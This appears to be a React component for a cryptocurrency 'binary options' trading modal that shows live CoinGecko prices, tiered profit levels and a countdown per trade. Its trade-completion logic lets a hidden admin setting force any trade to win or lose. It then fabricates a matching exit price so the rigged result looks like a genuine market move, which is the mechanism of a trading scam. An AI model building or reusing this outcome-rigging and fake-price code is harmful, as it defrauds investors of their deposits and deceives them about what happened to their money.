import React, { useState, useEffect, useRef, useCallback } from 'react'

// CoinGecko API for real prices - same as Dashboard
const CRYPTO_API = 'https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=250&page=1&sparkline=false&price_change_percentage=24h'

// Trading levels configuration (can be modified by admin)
const DEFAULT_TRADING_LEVELS = [
  { level: 1, minCapital: 100, maxCapital: 19999, profit: 18, duration: 180 },
  { level: 2, minCapital: 20000, maxCapital: 30000, profit: 23, duration: 360 },
  { level: 3, minCapital: 30001, maxCapital: 50000, profit: 33.5, duration: 720 },
  { level: 4, minCapital: 50001, maxCapital: 100000, profit: 50, duration: 1080 },
  { level: 5, minCapital: 100001, maxCapital: 300000, profit: 100, duration: 3600 },
]

// Available trading pairs
const TRADING_PAIRS = [
  { symbol: 'BTC/USDT', name: 'Bitcoin', icon: '₿' },
  { symbol: 'ETH/USDT', name: 'Ethereum', icon: 'Ξ' },
  { symbol: 'BNB/USDT', name: 'BNB', icon: '◆' },
  { symbol: 'XRP/USDT', name: 'Ripple', icon: '✕' },
  { symbol: 'SOL/USDT', name: 'Solana', icon: '◎' },
  { symbol: 'ADA/USDT', name: 'Cardano', icon: '₳' },
  { symbol: 'DOGE/USDT', name: 'Dogecoin', icon: 'Ð' },
  { symbol: 'DOT/USDT', name: 'Polkadot', icon: '●' },
  { symbol: 'MATIC/USDT', name: 'Polygon', icon: '⬡' },
  { symbol: 'AVAX/USDT', name: 'Avalanche', icon: '▲' },
]

// Real-time price chart component
function PriceChart({ pair, prices }) {
  const canvasRef = useRef(null)
  
  useEffect(() => {
    const canvas = canvasRef.current
    if (!canvas || prices.length < 2) return
    
    const ctx = canvas.getContext('2d')
    const width = canvas.width
    const height = canvas.height
    
    // Clear canvas
    ctx.fillStyle = '#0b1220'
    ctx.fillRect(0, 0, width, height)
    
    // Draw grid
    ctx.strokeStyle = 'rgba(255,255,255,0.05)'
    ctx.lineWidth = 1
    for (let i = 0; i < 5; i++) {
      const y = (height / 5) * i
      ctx.beginPath()
      ctx.moveTo(0, y)
      ctx.lineTo(width, y)
      ctx.stroke()
    }
    
    // Calculate price range
    const minPrice = Math.min(...prices)
    const maxPrice = Math.max(...prices)
    const priceRange = maxPrice - minPrice || 1
    
    // Draw price line
    const gradient = ctx.createLinearGradient(0, 0, width, 0)
    gradient.addColorStop(0, '#7c3aed')
    gradient.addColorStop(1, '#10b981')
    
    ctx.strokeStyle = gradient
    ctx.lineWidth = 2
    ctx.beginPath()
    
    prices.forEach((price, i) => {
      const x = (i / (prices.length - 1)) * width
      const y = height - ((price - minPrice) / priceRange) * (height - 20) - 10
      if (i === 0) ctx.moveTo(x, y)
      else ctx.lineTo(x, y)
    })
    ctx.stroke()
    
    // Draw area under line
    const areaGradient = ctx.createLinearGradient(0, 0, 0, height)
    areaGradient.addColorStop(0, 'rgba(124, 58, 237, 0.3)')
    areaGradient.addColorStop(1, 'rgba(124, 58, 237, 0)')
    
    ctx.fillStyle = areaGradient
    ctx.lineTo(width, height)
    ctx.lineTo(0, height)
    ctx.closePath()
    ctx.fill()
    
    // Draw current price line
    const lastPrice = prices[prices.length - 1]
    const lastY = height - ((lastPrice - minPrice) / priceRange) * (height - 20) - 10
    
    ctx.strokeStyle = '#10b981'
    ctx.lineWidth = 1
    ctx.setLineDash([5, 5])
    ctx.beginPath()
    ctx.moveTo(0, lastY)
    ctx.lineTo(width, lastY)
    ctx.stroke()
    ctx.setLineDash([])
    
  }, [prices])
  
  return (
    <div className="trade-chart-container">
      <canvas ref={canvasRef} width={400} height={200} className="trade-chart-canvas" />
    </div>
  )
}

// Countdown timer component
function CountdownTimer({ seconds, onComplete, isActive }) {
  const [timeLeft, setTimeLeft] = useState(seconds)
  const [progress, setProgress] = useState(100)
  
  useEffect(() => {
    setTimeLeft(seconds)
    setProgress(100)
  }, [seconds])
  
  useEffect(() => {
    if (!isActive || timeLeft <= 0) {
      if (timeLeft <= 0 && isActive) {
        onComplete?.()
      }
      return
    }
    
    const interval = setInterval(() => {
      setTimeLeft(prev => {
        const newTime = prev - 1
        setProgress((newTime / seconds) * 100)
        return newTime
      })
    }, 1000)
    
    return () => clearInterval(interval)
  }, [isActive, timeLeft, seconds, onComplete])
  
  const formatTime = (secs) => {
    const mins = Math.floor(secs / 60)
    const remainingSecs = secs % 60
    return `${mins.toString().padStart(2, '0')}:${remainingSecs.toString().padStart(2, '0')}`
  }
  
  return (
    <div className="countdown-timer">
      <div className="countdown-circle">
        <svg viewBox="0 0 100 100">
          <circle
            cx="50"
            cy="50"
            r="45"
            fill="none"
            stroke="rgba(255,255,255,0.1)"
            strokeWidth="8"
          />
          <circle
            cx="50"
            cy="50"
            r="45"
            fill="none"
            stroke={timeLeft < 30 ? '#ef4444' : '#7c3aed'}
            strokeWidth="8"
            strokeDasharray={`${progress * 2.83} 283`}
            strokeLinecap="round"
            transform="rotate(-90 50 50)"
            style={{ transition: 'stroke-dasharray 1s linear' }}
          />
        </svg>
        <div className="countdown-text">
          <span className="countdown-time">{formatTime(timeLeft)}</span>
          <span className="countdown-label">Time Left</span>
        </div>
      </div>
    </div>
  )
}

export default function Trade({ isOpen, onClose }) {
  // Trading state
  const [selectedPair, setSelectedPair] = useState(TRADING_PAIRS[0])
  const [selectedLevel, setSelectedLevel] = useState(null)
  const [tradeAmount, setTradeAmount] = useState('')
  const [tradeDirection, setTradeDirection] = useState(null) // 'up' or 'down'
  const [isTrading, setIsTrading] = useState(false)
  const [tradeResult, setTradeResult] = useState(null)
  const [entryPrice, setEntryPrice] = useState(null)
  
  // Price data
  const [currentPrice, setCurrentPrice] = useState(0)
  const [priceHistory, setPriceHistory] = useState([])
  const [priceChange, setPriceChange] = useState(0)
  
  // Trading levels (with admin capability to modify)
  const [tradingLevels, setTradingLevels] = useState(() => {
    const saved = localStorage.getItem('tradingLevels')
    return saved ? JSON.parse(saved) : DEFAULT_TRADING_LEVELS
  })
  
  // Admin outcome control - 'auto' = natural, 'win' = force win, 'lose' = force lose
  // Reads from master admin panel settings
  const [outcomeControl, setOutcomeControl] = useState(() => {
    const adminControl = localStorage.getItem('adminTradeControl')
    if (adminControl) {
      const parsed = JSON.parse(adminControl)
      return parsed.mode || 'auto'
    }
    return 'auto'
  })
  
  // Check for admin control updates from Master Admin Panel
  useEffect(() => {
    const checkAdminControl = () => {
      const adminControl = localStorage.getItem('adminTradeControl')
      if (adminControl) {
        const parsed = JSON.parse(adminControl)
        setOutcomeControl(parsed.mode || 'auto')
      }
    }
    
    // Check on mount and periodically
    checkAdminControl()
    const interval = setInterval(checkAdminControl, 1000)
    return () => clearInterval(interval)
  }, [])
  
  // Trade history
  const [tradeHistory, setTradeHistory] = useState(() => {
    const saved = localStorage.getItem('tradeHistory')
    return saved ? JSON.parse(saved) : []
  })
  
  // Real CoinGecko prices storage
  const [coinGeckoPrices, setCoinGeckoPrices] = useState({})
  
  // Fetch real prices from CoinGecko API (same as Dashboard)
  useEffect(() => {
    const fetchPrices = async () => {
      try {
        const response = await fetch(CRYPTO_API)
        if (response.ok) {
          const data = await response.json()
          const priceMap = {}
          data.forEach(coin => {
            const symbol = coin.symbol.toUpperCase()
            priceMap[symbol] = {
              price: coin.current_price,
              change24h: coin.price_change_percentage_24h
            }
          })
          setCoinGeckoPrices(priceMap)
        }
      } catch (error) {
        console.log('Using fallback prices')
      }
    }
    
    fetchPrices()
    // Refresh every 30 seconds
    const refreshInterval = setInterval(fetchPrices, 30000)
    return () => clearInterval(refreshInterval)
  }, [])
  
  // Real-time price updates using CoinGecko base price
  useEffect(() => {
    if (!isOpen) return
    
    // Get symbol without /USDT
    const symbol = selectedPair.symbol.split('/')[0]
    
    // Use CoinGecko price if available, otherwise fallback
    const fallbackPrices = {
      'BTC': 94500,
      'ETH': 3450,
      'BNB': 720,
      'XRP': 2.35,
      'SOL': 205,
      'ADA': 1.05,
      'DOGE': 0.32,
      'DOT': 7.8,
      'MATIC': 0.98,
      'AVAX': 42.5,
    }
    
    let basePrice = coinGeckoPrices[symbol]?.price || fallbackPrices[symbol] || 100
    setCurrentPrice(basePrice)
    setPriceHistory([basePrice])
    
    // Simulate small price movements around the real price
    const interval = setInterval(() => {
      // Refresh base price from CoinGecko if available
      const realPrice = coinGeckoPrices[symbol]?.price
      if (realPrice) {
        // Small random variation around real price (±0.1%)
        const variation = (Math.random() - 0.5) * 0.002
        basePrice = realPrice * (1 + variation)
      } else {
        // Fallback simulation
        const volatility = symbol === 'BTC' ? 0.0003 : 0.0005
        const change = (Math.random() - 0.5) * 2 * volatility
        basePrice = basePrice * (1 + change)
      }
      
      const prevPrice = priceHistory[priceHistory.length - 1] || basePrice
      const changePercent = ((basePrice - prevPrice) / prevPrice) * 100
      
      setCurrentPrice(basePrice)
      setPriceChange(changePercent)
      setPriceHistory(prev => {
        const newHistory = [...prev, basePrice]
        return newHistory.slice(-100) // Keep last 100 points
      })
    }, 1000)
    
    return () => clearInterval(interval)
  }, [isOpen, selectedPair, coinGeckoPrices])
  
  // Determine available level based on trade amount
  useEffect(() => {
    const amount = parseFloat(tradeAmount) || 0
    const level = tradingLevels.find(l => amount >= l.minCapital && amount <= l.maxCapital)
    setSelectedLevel(level || null)
  }, [tradeAmount, tradingLevels])
  
  // Handle trade completion with admin outcome control
  const handleTradeComplete = useCallback(() => {
    if (!entryPrice || !currentPrice || !tradeDirection) return
    
    const priceWentUp = currentPrice > entryPrice
    let naturalWin = (tradeDirection === 'up' && priceWentUp) || (tradeDirection === 'down' && !priceWentUp)
    
    // Admin outcome control override
    let won = naturalWin
    if (outcomeControl === 'win') {
      won = true
    } else if (outcomeControl === 'lose') {
      won = false
    }
    // 'auto' uses natural outcome
    
    const amount = parseFloat(tradeAmount)
    const profit = won ? amount * (selectedLevel.profit / 100) : -amount
    
    // Generate fake exit price that matches the outcome
    let displayExitPrice = currentPrice
    if (outcomeControl !== 'auto') {
      // Manipulate displayed exit price to match forced outcome
      if (won && tradeDirection === 'up') {
        displayExitPrice = entryPrice * 1.001 // Show price went up
      } else if (won && tradeDirection === 'down') {
        displayExitPrice = entryPrice * 0.999 // Show price went down
      } else if (!won && tradeDirection === 'up') {
        displayExitPrice = entryPrice * 0.999 // Show price went down (loss)
      } else if (!won && tradeDirection === 'down') {
        displayExitPrice = entryPrice * 1.001 // Show price went up (loss)
      }
    }
    
    const result = {
      won,
      profit,
      entryPrice,
      exitPrice: displayExitPrice,
      direction: tradeDirection,
      pair: selectedPair.symbol,
      amount: amount,
      timestamp: Date.now(),
      controlled: outcomeControl !== 'auto'
    }
    
    setTradeResult(result)
    setIsTrading(false)
    
    // Save to trade history for admin
    setTradeHistory(prev => {
      const updated = [result, ...prev].slice(0, 50) // Keep last 50 trades
      localStorage.setItem('tradeHistory', JSON.stringify(updated))
      return updated
    })
  }, [entryPrice, currentPrice, tradeDirection, tradeAmount, selectedLevel, outcomeControl, selectedPair])
  
  // Start trade
  const startTrade = (direction) => {
    if (!selectedLevel || !tradeAmount) return
    
    setTradeDirection(direction)
    setEntryPrice(currentPrice)
    setIsTrading(true)
    setTradeResult(null)
  }
  
  // Reset trade
  const resetTrade = () => {
    setTradeDirection(null)
    setEntryPrice(null)
    setIsTrading(false)
    setTradeResult(null)
    setTradeAmount('')
  }
  
  // Format price
  const formatPrice = (price) => {
    if (price >= 1000) return price.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })
    if (price >= 1) return price.toFixed(4)
    return price.toFixed(6)
  }
  
  // Format duration
  const formatDuration = (seconds) => {
    if (seconds >= 3600) return `${(seconds / 3600).toFixed(1)}h`
    return `${Math.floor(seconds / 60)}m`
  }

  if (!isOpen) return null

  return (
    <div className="trade-modal-overlay" onClick={onClose}>
      <div className="trade-modal" onClick={e => e.stopPropagation()}>
        {/* Header */}
        <div className="trade-header">
          <h2>Binary Options Trading</h2>
          <button className="trade-close-btn" onClick={onClose}>×</button>
        </div>

        {/* Trading Pair Selector */}
        <div className="trade-pair-selector">
          <label>Select Trading Pair</label>
          <div className="pair-grid">
            {TRADING_PAIRS.map(pair => (
              <button
                key={pair.symbol}
                className={`pair-btn ${selectedPair.symbol === pair.symbol ? 'active' : ''}`}
                onClick={() => setSelectedPair(pair)}
              >
                <span className="pair-icon">{pair.icon}</span>
                <span className="pair-symbol">{pair.symbol}</span>
              </button>
            ))}
          </div>
        </div>

        {/* Live Price Display */}
        <div className="trade-price-display">
          <div className="price-header">
            <span className="pair-name">{selectedPair.name}</span>
            <span className={`price-change ${priceChange >= 0 ? 'positive' : 'negative'}`}>
              {priceChange >= 0 ? '▲' : '▼'} {Math.abs(priceChange).toFixed(4)}%
            </span>
          </div>
          <div className="current-price">
            ${formatPrice(currentPrice)}
          </div>
          <PriceChart pair={selectedPair} prices={priceHistory} />
        </div>

        {/* Trading Levels */}
        <div className="trade-levels">
          <label>Trading Levels</label>
          <div className="levels-grid">
            {tradingLevels.map((level, index) => (
              <div 
                key={level.level}
                className={`level-card ${selectedLevel?.level === level.level ? 'active' : ''} ${
                  parseFloat(tradeAmount) >= level.minCapital && parseFloat(tradeAmount) <= level.maxCapital ? 'available' : ''
                }`}
              >
                <div className="level-header">Level {level.level}</div>
                <div className="level-capital">
                  ${level.minCapital.toLocaleString()} - ${level.maxCapital.toLocaleString()}
                </div>
                <div className="level-details">
                  <span className="level-profit">+{level.profit}%</span>
                  <span className="level-duration">{formatDuration(level.duration)}</span>
                </div>
              </div>
            ))}
          </div>
        </div>

        {/* Trade Input */}
        {!isTrading && !tradeResult && (
          <div className="trade-input-section">
            <div className="trade-amount-input">
              <label>Investment Amount (USDT)</label>
              <input
                type="number"
                value={tradeAmount}
                onChange={(e) => setTradeAmount(e.target.value)}
                placeholder="Enter amount (min 100 USDT)"
                min="100"
              />
              {selectedLevel && (
                <div className="level-info">
                  Level {selectedLevel.level} • {selectedLevel.profit}% Profit • {formatDuration(selectedLevel.duration)} Duration
                </div>
              )}
            </div>

            <div className="trade-direction-btns">
              <button 
                className="direction-btn up"
                onClick={() => startTrade('up')}
                disabled={!selectedLevel}
              >
                <span className="direction-icon">▲</span>
                <span className="direction-label">UP</span>
                <span className="direction-desc">Price will rise</span>
              </button>
              <button 
                className="direction-btn down"
                onClick={() => startTrade('down')}
                disabled={!selectedLevel}
              >
                <span className="direction-icon">▼</span>
                <span className="direction-label">DOWN</span>
                <span className="direction-desc">Price will fall</span>
              </button>
            </div>
          </div>
        )}

        {/* Active Trade */}
        {isTrading && selectedLevel && (
          <div className="active-trade">
            <div className="trade-info-row">
              <div className="info-item">
                <span className="info-label">Direction</span>
                <span className={`info-value ${tradeDirection}`}>
                  {tradeDirection === 'up' ? '▲ UP' : '▼ DOWN'}
                </span>
              </div>
              <div className="info-item">
                <span className="info-label">Entry Price</span>
                <span className="info-value">${formatPrice(entryPrice)}</span>
              </div>
              <div className="info-item">
                <span className="info-label">Current Price</span>
                <span className={`info-value ${currentPrice > entryPrice ? 'positive' : 'negative'}`}>
                  ${formatPrice(currentPrice)}
                </span>
              </div>
              <div className="info-item">
                <span className="info-label">Potential Profit</span>
                <span className="info-value positive">
                  +${(parseFloat(tradeAmount) * selectedLevel.profit / 100).toFixed(2)}
                </span>
              </div>
            </div>
            
            <CountdownTimer 
              seconds={selectedLevel.duration}
              onComplete={handleTradeComplete}
              isActive={isTrading}
            />
            
            <div className="trade-progress-bar">
              <div 
                className={`progress-fill ${
                  (tradeDirection === 'up' && currentPrice > entryPrice) ||
                  (tradeDirection === 'down' && currentPrice < entryPrice)
                    ? 'winning' : 'losing'
                }`}
                style={{ 
                  width: `${Math.min(100, Math.abs(((currentPrice - entryPrice) / entryPrice) * 10000))}%` 
                }}
              />
            </div>
          </div>
        )}

        {/* Trade Result */}
        {tradeResult && (
          <div className={`trade-result ${tradeResult.won ? 'won' : 'lost'}`}>
            <div className="result-icon">
              {tradeResult.won ? '🎉' : '😔'}
            </div>
            <div className="result-title">
              {tradeResult.won ? 'Trade Won!' : 'Trade Lost'}
            </div>
            <div className="result-amount">
              {tradeResult.won ? '+' : ''}{tradeResult.profit.toFixed(2)} USDT
            </div>
            <div className="result-details">
              <span>Entry: ${formatPrice(tradeResult.entryPrice)}</span>
              <span>Exit: ${formatPrice(tradeResult.exitPrice)}</span>
            </div>
            <button className="trade-again-btn" onClick={resetTrade}>
              Trade Again
            </button>
          </div>
        )}
      </div>
    </div>
  )
}
